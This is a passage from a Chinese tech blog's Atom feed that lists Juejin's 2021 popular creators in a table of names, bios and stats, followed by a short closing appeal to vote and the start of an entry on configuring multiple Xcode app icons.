align="left">1525</td><td align="left">5</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4089838987914456">柏炎</a></td><td align="left">热爱hiphop,热爱酒精</td><td align="left">公众号：柏炎大叔</td><td align="left">-</td><td align="left">36</td><td align="left">1195</td><td align="left">50998</td><td align="left">334</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2840793776918375">小铭子</a></td><td align="left">如果这世界真有奇迹，那是努力的另一个名字</td><td align="left">前端开发工程师</td><td align="left">-</td><td align="left">49</td><td align="left">869</td><td align="left">71041</td><td align="left">271</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/377887729924872">MinXie</a></td><td align="left">-</td><td align="left">后端 看山不是山</td><td align="left">-</td><td align="left">4</td><td align="left">10</td><td align="left">1365</td><td align="left">3</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/588993964541288">CoderStar</a></td><td align="left">Think more, Code less</td><td align="left">公众号：CoderStar</td><td align="left">iOS开发工程师</td><td align="left">iOS 摸鱼周报联合编辑</td><td align="left">28</td><td align="left">326</td><td align="left">29619</td><td align="left">149</td></tr><tr><td align="left"><a href="https://juejin.cn/user/201965867640862">JinBeen</a></td><td align="left">你所有的问题都有答案</td><td align="left">Android开发</td><td align="left">bevol</td><td align="left">13</td><td align="left">490</td><td align="left">34175</td><td align="left">98</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1626932940385368">林深鹿</a></td><td align="left">林深时见鹿，海蓝时见鲸，梦醒时见你</td><td align="left">公众号：第六十六封信</td><td align="left">-</td><td align="left">104</td><td align="left">1555</td><td align="left">43555</td><td align="left">114</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1293455879050157">Finbird</a></td><td align="left">-</td><td align="left">大前端</td><td align="left">-</td><td align="left">21</td><td align="left">33</td><td align="left">3343</td><td align="left">7</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/43636193770071">卤蛋实验室</a></td><td align="left">-</td><td align="left">公众号</td><td align="left">卤蛋实验室</td><td align="left">20</td><td align="left">2621</td><td align="left">97302</td><td align="left">814</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/836068767437245">执久呀</a></td><td align="left">CSDN账号：执久呀</td><td align="left">-</td><td align="left">-</td><td align="left">5</td><td align="left">6</td><td align="left">189</td><td align="left">0</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3412492674665367">归子莫</a></td><td align="left">一枚从后端过来的前端开发工程师，对前端（VR、视觉效果、动画、框架）和后端有兴趣。公众号：归子莫。</td><td align="left">前端玩全栈</td><td align="left">公众号【归子莫】</td><td align="left">72</td><td align="left">461</td><td align="left">23201</td><td align="left">32</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4283353031783015">枸杞菊花保温杯</a></td><td align="left">-</td><td align="left">iOS</td><td align="left">Flutter</td><td align="left">NULL</td><td align="left">98</td><td align="left">266</td><td align="left">102385</td><td align="left">221</td></tr><tr><td align="left"><a href="https://juejin.cn/user/493043443054494">WangScaler</a></td><td align="left">a small developer !</td><td align="left">CV/API增删改查工程师</td><td align="left">China</td><td align="left">83</td><td align="left">479</td><td align="left">27524</td><td align="left">40</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3957869870592685">星始流年</a></td><td align="left">路漫漫，上下求索。</td><td align="left">前端工程师</td><td align="left">-</td><td align="left">45</td><td align="left">692</td><td align="left">51973</td><td align="left">152</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1187911064884935">我先测了</a></td><td align="left">你好，我叫尤勇，我喜欢下棋；<br>你好，我叫夏琪，我喜欢游泳。</td><td align="left">神级白月光</td><td align="left">美梦公司</td><td align="left">39</td><td align="left">206</td><td align="left">5069</td><td align="left">17</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1636485994149022">三掌柜</a></td><td align="left">一分耕耘，不一定有一份收获，但十分耕耘，一定会有一分收获</td><td align="left">架构师</td><td align="left">某某某科技有限责任公司</td><td align="left">167</td><td align="left">267</td><td align="left">35487</td><td align="left">34</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3025489497950094">明无生</a></td><td align="left">无怨无悔我走我路，走不尽天涯路。</td><td align="left">侠客</td><td align="left">武林</td><td align="left">95</td><td align="left">22</td><td align="left">9256</td><td align="left">6</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3747558609661213">小只前端攻城狮</a></td><td align="left">Web全栈开发、持续学习者，关注公众号第一时间接收最新文章，也经常分享一些好用的工具</td><td align="left">公众号：小攻城狮学前端</td><td align="left">滴滴</td><td align="left">前端研发工程师</td><td align="left">140</td><td align="left">1994</td><td align="left">54940</td><td align="left">170</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1336628107814488">零一01</a></td><td align="left">我是「零一」，记录技术成长过程中的点点滴滴，请大家见证我从0到1的过程吧</td><td align="left">公众号「前端印象」</td><td align="left">字节跳动</td><td align="left">29</td><td align="left">4928</td><td align="left">219209</td><td align="left">1895</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2999926721615966">不吃鱼d猫</a></td><td align="left">正在学习js</td><td align="left">前端实习生</td><td align="left">-</td><td align="left">20</td><td align="left">106</td><td align="left">1793</td><td align="left">7</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1390249158639911">呆呆敲代码的小Y</a></td><td align="left">主要关注Unity引擎的项目开发引用</td><td align="left">公众号：呆呆敲代码的小Y</td><td align="left">-</td><td align="left">105</td><td align="left">3341</td><td align="left">187164</td><td align="left">214</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2172290705131016">Antway</a></td><td align="left">专注开源库。公司大数据行业，大量岗位招人。wx：Antway1024</td><td align="left">研发工程师</td><td align="left">-</td><td align="left">52</td><td align="left">560</td><td align="left">49941</td><td align="left">222</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4107431172383597">阿加西卡机嘛</a></td><td align="left">刷子游戏爱好者= =</td><td align="left">前端工程师</td><td align="left">某外企</td><td align="left">2</td><td align="left">29</td><td align="left">1967</td><td align="left">11</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/712139265547598">Ichmag</a></td><td align="left">-</td><td align="left">前端</td><td align="left">-</td><td align="left">27</td><td align="left">292</td><td align="left">24914</td><td align="left">38</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4019470243477719">这可还行</a></td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">30</td><td align="left">5</td><td align="left">2084</td><td align="left">0</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1257497031092862">我是绿色大米呀</a></td><td align="left">-</td><td align="left">Android搬砖人</td><td align="left">教小朋友说话公司</td><td align="left">66</td><td align="left">2148</td><td align="left">125135</td><td align="left">631</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/624178334797934">胡七筒</a></td><td align="left">码代码，码文字，从不偷工减料。 有着一副人畜无害的皮囊，还有着一颗沁人心脾的有趣灵魂。</td><td align="left">码文字的程序猿</td><td align="left">你猜</td><td align="left">66</td><td align="left">4563</td><td align="left">540972</td><td align="left">4574</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/729731453434696">飞翔的cookie</a></td><td align="left">-</td><td align="left">前端工程师</td><td align="left">某某树</td><td align="left">1</td><td align="left">32</td><td align="left">1224</td><td align="left">7</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2445792987055518">DarkKing</a></td><td align="left">Java技术架构师，熟悉大数据，分布式，高并发等领域</td><td align="left">技术经理</td><td align="left">-</td><td align="left">46</td><td align="left">45</td><td align="left">6531</td><td align="left">7</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3193419847964990">全能干饭猿</a></td><td align="left">In my life Ijust smile !</td><td align="left">-</td><td align="left">勇敢牛牛-不怕困难</td><td align="left">2</td><td align="left">4</td><td align="left">140</td><td align="left">3</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/70787819648695">岛上码农</a></td><td align="left">从南飘到北，从北游到南的业余码农</td><td align="left">公众号</td><td align="left">岛上码农</td><td align="left">203</td><td align="left">4699</td><td align="left">296717</td><td align="left">1219</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/325111174941383">浅_梦</a></td><td align="left">¢</td><td align="left">前端开发</td><td align="left">-</td><td align="left">8</td><td align="left">10</td><td align="left">882</td><td align="left">4</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3377343099308552">小道安全</a></td><td align="left">公众号:小道安全</td><td align="left">公众号：小道安全</td><td align="left">-</td><td align="left">53</td><td align="left">998</td><td align="left">29972</td><td align="left">104</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2462537381852910">吃蟹黄的Thilo</a></td><td align="left">蟹黄吃到饱，前端搞的好，一个梦想能吃蟹黄吃到饱的前端程序员</td><td align="left">前端 @电商</td><td align="left">-</td><td align="left">13</td><td align="left">1721</td><td align="left">46755</td><td align="left">247</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1336634687882958">Arrom</a></td><td align="left">生命太短暂，没时间遗憾，一分钟都不要留给那些让你不快的人或事。若不是终点，请一直微笑向前!</td><td align="left">研发工程师</td><td align="left">-</td><td align="left">113</td><td align="left">159</td><td align="left">11100</td><td align="left">9</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3579665589747287">杨建国啦</a></td><td align="left">虾皮内推</td><td align="left">公众号：七溜八溜</td><td align="left">-</td><td align="left">6</td><td align="left">70</td><td align="left">7625</td><td align="left">4</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3334168064041383"><em>祯不错</em></a></td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">10</td><td align="left">0</td><td align="left">236</td><td align="left">1</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2225067265891902">贰拾壹先生</a></td><td align="left">可以随心所欲，但不能随波逐流</td><td align="left">前端工程师</td><td align="left">平安</td><td align="left">122</td><td align="left">156</td><td align="left">19597</td><td align="left">11</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2541726616791037">绝了</a></td><td align="left">与其不分青红皂白地一味否定，不如在肯定现状的基础上，寻找并提出能带来改善的建议。</td><td align="left">sql工程师</td><td align="left">小厂</td><td align="left">9</td><td align="left">164</td><td align="left">13310</td><td align="left">66</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/61228381382391">程序猿阿朗</a></td><td align="left">Hello world :) 早睡早起，坚持不懈</td><td align="left">微信：程序猿阿朗</td><td align="left">Alibaba</td><td align="left">63</td><td align="left">600</td><td align="left">91254</td><td align="left">329</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1239904848713592">HaiJun</a></td><td align="left">前端领域贡献者</td><td align="left">前端工程师</td><td align="left">公众号： 前端自学社区</td><td align="left">31</td><td align="left">1089</td><td align="left">73475</td><td align="left">275</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3052689406040605">BennuCTech</a></td><td align="left">公众号：BennuCTech</td><td align="left">公众号：BennuCTech</td><td align="left">小盒</td><td align="left">44</td><td align="left">85</td><td align="left">12268</td><td align="left">20</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1688446223255640">盗道</a></td><td align="left">-</td><td align="left">资深前端开发</td><td align="left">-</td><td align="left">11</td><td align="left">207</td><td align="left">12868</td><td align="left">20</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/624955633174733">Sometimes</a></td><td align="left">个人博客：<a href="https://bookbook.cc/">https://bookbook.cc</a></td><td align="left">前端</td><td align="left">小厂</td><td align="left">1</td><td align="left">1</td><td align="left">32</td><td align="left">1</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/729731449230711">丨隋堤倦客丨</a></td><td align="left">我挥舞着键盘和本子，发誓要把这世界写个明明白白！！！</td><td align="left">前端工程师</td><td align="left">zoom</td><td align="left">43</td><td align="left">311</td><td align="left">19063</td><td align="left">75</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/474627279698541">小伙子vae</a></td><td align="left">keep going forward, keep going up, never stop</td><td align="left">研发工程师</td><td align="left">-</td><td align="left">88</td><td align="left">1240</td><td align="left">42753</td><td align="left">124</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1275089218702142">劲风君</a></td><td align="left">爬山、跑步、羽毛球</td><td align="left">Python开发工程师</td><td align="left">-</td><td align="left">72</td><td align="left">13</td><td align="left">7858</td><td align="left">5</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3790771823848935">芒果啊</a></td><td align="left">Endless knowledge, endless learning</td><td align="left">前端ing</td><td align="left"><a href="mailto:&#x78;&#57;&#x35;&#51;&#51;&#51;&#64;&#115;&#x6f;&#x68;&#117;&#x2e;&#x63;&#111;&#109;">&#x78;&#57;&#x35;&#51;&#51;&#51;&#64;&#115;&#x6f;&#x68;&#117;&#x2e;&#x63;&#111;&#109;</a></td><td align="left">36</td><td align="left">83</td><td align="left">8694</td><td align="left">10</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/361064813312728">扁鹊</a></td><td align="left">活着就行🤪</td><td align="left">Java后端开发</td><td align="left">-</td><td align="left">9</td><td align="left">0</td><td align="left">325</td><td align="left">1</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/536217406407710">伟大的兔神</a></td><td align="left">HTML、CSS、JS、VUE</td><td align="left">公众号丨长耳朵兔兔进击前端</td><td align="left">能干</td><td align="left">43</td><td align="left">809</td><td align="left">43255</td><td align="left">218</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/536217405895149">王大呀呀</a></td><td align="left">是个学技术的小学生，只想为行业做一点微不足道的</td><td align="left">学生</td><td align="left">-</td><td align="left">627</td><td align="left">3612</td><td align="left">223070</td><td align="left">107</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3913917127985240">Zhujiang</a></td><td align="left">《Jetpack Compose：Android全新UI编程》作者，公众号：江江安卓</td><td align="left">《Jetpack Compose：Android全新UI编程》</td><td align="left">联想</td><td align="left">38</td><td align="left">1205</td><td align="left">135606</td><td align="left">2181</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3175045314389278">Benbinbin</a></td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">72</td><td align="left">138</td><td align="left">23984</td><td align="left">23</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3668388983878573">我犟不过你</a></td><td align="left">java开发，微服务，数据库，架构~<br><br>除了个高一无是处，没事打打篮球，写写bug，写写博客。</td><td align="left">java</td><td align="left">求哈尔滨或能远程办公的收留啊</td><td align="left">77</td><td align="left">125</td><td align="left">12003</td><td align="left">25</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1028798614873447">阿Q说代码</a></td><td align="left">阿Q是公众号“阿Q说代码”作者、码农，专注分享java技术干货：多线程、JVM、Spring Boot、Spring Cloud、Redis、ElasticSearch、Zookeeper、消息队列、面试题等。</td><td align="left">Java开发</td><td align="left">-</td><td align="left">82</td><td align="left">202</td><td align="left">26618</td><td align="left">58</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2753622735323159">菜菜bu菜</a></td><td align="left">一起做一件很酷的事情</td><td align="left">互联网种菜</td><td align="left">银河系干饭有限公司</td><td align="left">28</td><td align="left">741</td><td align="left">14495</td><td align="left">41</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2692076826529383">吴梦青</a></td><td align="left">公众号：见过你的反馈。写书评、记录生活。代码是我的自由，文字是我的远方。</td><td align="left">-</td><td align="left">-</td><td align="left">23</td><td align="left">3</td><td align="left">991</td><td align="left">1</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4309700183594366">欧怼怼</a></td><td align="left">Talk is cheap.</td><td align="left">前端</td><td align="left">-</td><td align="left">17</td><td align="left">636</td><td align="left">22366</td><td align="left">112</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/571401777200855">青莲使者</a></td><td align="left">公众号：前端北极星</td><td align="left">高级前端开发</td><td align="left">不大不小公司</td><td align="left">91</td><td align="left">1120</td><td align="left">35995</td><td align="left">54</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3905939872951085">Android帅次</a></td><td align="left">掘金行必有我师焉。</td><td align="left">知识的搬运工</td><td align="left">公众号：帅次</td><td align="left">81</td><td align="left">2240</td><td align="left">85659</td><td align="left">270</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/149189312913511">芦航</a></td><td align="left">Android稳定性，高通，复旦</td><td align="left">-</td><td align="left">-</td><td align="left">26</td><td align="left">476</td><td align="left">76650</td><td align="left">547</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2541726614695704">零狐冲</a></td><td align="left">撸铁</td><td align="left">搬砖人</td><td align="left">-</td><td align="left">23</td><td align="left">1154</td><td align="left">15209</td><td align="left">62</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1204720443862887">依然范特稀西</a></td><td align="left">一个喜欢篮球、音乐、电影的程序员，Android工程师。欢迎关注我的微信公众</td><td align="left">公众号 @技术最TOP</td><td align="left">-</td><td align="left">106</td><td align="left">17756</td><td align="left">660781</td><td align="left">16053</td><td align="left">6</td></tr><tr><td align="left"><a href="https://juejin.cn/user/386677132243320">代尔码夫</a></td><td align="left">我是一名程序员，天天写代码。</td><td align="left">Android 工程师</td><td align="left">-</td><td align="left">23</td><td align="left">36</td><td align="left">4143</td><td align="left">6</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3544481218435549">左耳咚</a></td><td align="left">-</td><td align="left">-</td><td align="left">-</td><td align="left">1</td><td align="left">17</td><td align="left">502</td><td align="left">6</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2049902560674295">陈言必行</a></td><td align="left">个人微信：czy59421；关注公众号：领取我为你精心准备的程序书籍，另有几十款经典游戏源码等你来取哦~</td><td align="left">公众号</td><td align="left">开发同学留步</td><td align="left">224</td><td align="left">2114</td><td align="left">27221</td><td align="left">59</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3853127158081144">Hydra</a></td><td align="left">公众号“码农参上”作者，爱好美食、运动、摄影、ACG的程序猿。</td><td align="left">公众号【码农参上】</td><td align="left">-</td><td align="left">66</td><td align="left">182</td><td align="left">17473</td><td align="left">22</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4485631602599495">那些年丶ny</a></td><td align="left">某某公司的小小前端</td><td align="left">小小前端</td><td align="left">-</td><td align="left">49</td><td align="left">973</td><td align="left">28849</td><td align="left">68</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4248168662568120">前段切图仔</a></td><td align="left">-</td><td align="left">前端开发攻城狮</td><td align="left">-</td><td align="left">15</td><td align="left">21</td><td align="left">1991</td><td align="left">0</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2216217609507229">5加H</a></td><td align="left">-</td><td align="left">前端代码工</td><td align="left">-</td><td align="left">34</td><td align="left">81</td><td align="left">9173</td><td align="left">16</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/316285295010925">水鳜鱼肥</a></td><td align="left">找点乐子让自己开心开心</td><td align="left">面向漂亮PM编程</td><td align="left">-</td><td align="left">12</td><td align="left">186</td><td align="left">11264</td><td align="left">42</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4160207732616669">uWydnA</a></td><td align="left">-</td><td align="left">一个静态语言的灵魂</td><td align="left">-</td><td align="left">7</td><td align="left">37</td><td align="left">2279</td><td align="left">7</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1680474815073805">RiemannHypo</a></td><td align="left">来都来了，点个赞呗！公众号RiemannHypo</td><td align="left">QA</td><td align="left">Citi Group</td><td align="left">18</td><td align="left">299</td><td align="left">4059</td><td align="left">18</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4459274891172327">今阳</a></td><td align="left">一个Android开发</td><td align="left">公众号「今阳说」</td><td align="left">-</td><td align="left">112</td><td align="left">319</td><td align="left">34769</td><td align="left">73</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/668101431009496">RicardoMJiang</a></td><td align="left">-</td><td align="left">Android Developer</td><td align="left">-</td><td align="left">60</td><td align="left">3045</td><td align="left">275311</td><td align="left">1147</td><td align="left">4</td></tr><tr><td align="left"><a href="https://juejin.cn/user/8451824316670">Halifax</a></td><td align="left">星光不问赶路人，岁月不负有心人</td><td align="left">Android @ 微信号: fuqiang2020</td><td align="left">-</td><td align="left">21</td><td align="left">1080</td><td align="left">36247</td><td align="left">186</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3069492197078279">吴文周</a></td><td align="left">前端开发</td><td align="left">南京前端</td><td align="left">云学堂</td><td align="left">50</td><td align="left">319</td><td align="left">37312</td><td align="left">123</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4353721778057997">season_zhu</a></td><td align="left">Swift/OC/Flutter/Python/Vue</td><td align="left">大前端API调用工程师</td><td align="left">Otaku</td><td align="left">105</td><td align="left">2287</td><td align="left">132673</td><td align="left">359</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3984285870859614">神奇的程序员</a></td><td align="left">今天的努力只为未来</td><td align="left">前端开发</td><td align="left">广州某中型公司</td><td align="left">128</td><td align="left">7631</td><td align="left">553909</td><td align="left">3381</td><td align="left">5</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4063433943168343">陈煮酒</a></td><td align="left">React / Node.js / 前端工程化</td><td align="left">前端工程师</td><td align="left">-</td><td align="left">3</td><td align="left">65</td><td align="left">3055</td><td align="left">13</td><td align="left">1</td></tr><tr><td align="left"><a href="https://juejin.cn/user/650530414137534">小科比_</a></td><td align="left">我爱学习，谁tm都别想打扰我学习</td><td align="left">前端研发工程师</td><td align="left">字节跳动</td><td align="left">22</td><td align="left">1077</td><td align="left">55438</td><td align="left">249</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/1662117313775806">前端自学驿站</a></td><td align="left">业精于勤，荒于嬉。</td><td align="left">公众号「前端自学驿站」</td><td align="left">-</td><td align="left">31</td><td align="left">2697</td><td align="left">106772</td><td align="left">1036</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4318537404123688">同学小强</a></td><td align="left">🔐 🏎  一个上了年纪的新人 🚁 ⛹🏻‍♂️</td><td align="left">React/JavaScript/Nodejs搬运工</td><td align="left">公众号「同学小强」</td><td align="left">7</td><td align="left">112</td><td align="left">4608</td><td align="left">24</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/4248168660735310">wangly19</a></td><td align="left">学习中</td><td align="left">🏆 掘金签约作者</td><td align="left">一起学习&amp;微信：Rzicon</td><td align="left">60</td><td align="left">7195</td><td align="left">367884</td><td align="left">2308</td><td align="left">5</td></tr><tr><td align="left"><a href="https://juejin.cn/user/2357827986264942">hqk</a></td><td align="left">技术这条路，并不只是一比高下，而是一同成长！</td><td align="left">Android</td><td align="left">-</td><td align="left">56</td><td align="left">777</td><td align="left">42231</td><td align="left">173</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/3324525301727949">海的对岸</a></td><td align="left">Vue.js</td><td align="left">公众号：超哥在学习</td><td align="left">-</td><td align="left">52</td><td align="left">1832</td><td align="left">39268</td><td align="left">202</td><td align="left">3</td></tr><tr><td align="left"><a href="https://juejin.cn/user/281912383374237">Aaron_hj</a></td><td align="left">想要成为某一领域技术大牛的前端人，欢迎交流～</td><td align="left">前端</td><td align="left">滴滴</td><td align="left">16</td><td align="left">321</td><td align="left">10924</td><td align="left">64</td><td align="left">2</td></tr><tr><td align="left"><a href="https://juejin.cn/user/870468939424205">搬砖_胖子</a></td><td align="left">我走过你走过的路，我即将走你走过的路，我走过你要走的路，我即将走你没走过的路。</td><td align="left">前端</td><td align="left">搬砖学院</td><td align="left">10</td><td align="left">119</td><td align="left">15070</td><td align="left">16</td><td align="left">2</td></tr></tbody></table><h3 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h3><p>当我看到优秀文章内容的时候，总是欣喜若狂！那种感觉大家应该都体会过，所以，希望本文可以让大家能收获到一些优秀的创作者，学习到更多的干货，总结 2021，向优秀学习，勇敢向往 2021！</p><p>最后，如果大家还有多余投票次数，欢迎给我们的团队投票，或者给笔者投票：</p><ul><li><a href="https://rank.juejin.cn/rank/2021/1002387318511214">37手游iOS技术运营团队 - 2021年度人气创作者榜单</a></li><li><a href="https://rank.juejin.cn/rank/2021/1908407915780989">iHTCboy - 2021年度人气创作者榜单</a></li></ul><p>最后，感谢掘金举办的这次活动，让开发者欢聚一堂，同时也让活跃的开发者呈现在大家面前，正如掘金活动页面写的：</p><blockquote><p>相信技术，传递价值，这是掘金每一个技术创作者的动力与信念。<br>他们分享前沿的技术创新，输出最佳的生产实践，影响着每一个上进的开发者</p></blockquote><h3 id="五、参考引用"><a href="#五、参考引用" class="headerlink" title="五、参考引用"></a>五、参考引用</h3><ul><li><a href="https://rank.juejin.cn/rank/2021">掘金 - 2021年度人气创作者榜单</a></li><li><a href="https://rank.juejin.cn/rank/2021/1002387318511214">37手游iOS技术运营团队 - 2021年度人气创作者榜单</a></li><li><a href="https://rank.juejin.cn/rank/2021/1908407915780989">iHTCboy - 2021年度人气创作者榜单</a></li></ul><br><ul><li>如有侵权，联系必删！</li><li>如有不正确的地方，欢迎指导！</li><li>如有疑问，欢迎在评论区一起讨论！</li></ul><br><blockquote><p>注：本文首发于 <a href="https://ihtcboy.com/">iHTCboy’s blog</a>，如若转载，请注来源。</p></blockquote><br>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h3&gt;&lt;p&gt;想起最近大家的一个讨论：“现在互联网这么多内容，我应该从那里开始学？跟谁学？”，还有很多优秀的技术团队或者开发者博客等很久没有发表新文章了，怎么让技术社区活跃起来等等。&lt;/p&gt;
&lt;p&gt;正值 2021 年结尾，掘金举办《&lt;a href=&quot;https://rank.juejin.cn/rank/2021&quot;&gt;2021年度人气创作者榜单&lt;/a&gt;》活动，让我们程序员狂欢的同时，其实也让优秀的开发者和团队，出现在大众的视野，出现在闪烁光芒的舞台舞台上！&lt;/p&gt;
&lt;p&gt;所以，笔者从掘金的活动页面，梳理了人气创作者榜单，希望大家在投票和狂欢的同时，认识到更多优秀的开发者和团队，关注他们的文章和创新！向优秀学习，是让我们变成自己变得优秀的基础。&lt;/p&gt;</summary>
    
    
    
    <category term="technology" scheme="https://ihtcboy.com/categories/technology/"/>
    
    
    <category term="掘金" scheme="https://ihtcboy.com/tags/%E6%8E%98%E9%87%91/"/>
    
    <category term="技术博客" scheme="https://ihtcboy.com/tags/%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/"/>
    
    <category term="技术团队" scheme="https://ihtcboy.com/tags/%E6%8A%80%E6%9C%AF%E5%9B%A2%E9%98%9F/"/>
    
  </entry>
  
  <entry>
    <title>Xcode 配置多套 App 图标的方法 --- AppStore 图标 A/B Test 实践</title>
    <link href="https://ihtcboy.com/2021/12/23/2021-12-23_Xcode%E9%85%8D%E7%BD%AE%E5%A4%9A%E5%A5%97App%E5%9B%BE%E6%A0%87%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>https://ihtcboy.com/2021/12/23/2021-12-23_Xcode%E9%85%8D%E7%BD%AE%E5%A4%9A%E5%A5%97App%E5%9B%BE%E6%A0%87%E7%9A%84%E6%96%B9%E6%B3%95/</id>
    <published>2021-12-23T04:28:16.000Z</published>
    <updated>2022-02-13T12:52:47.686Z</updated>
    
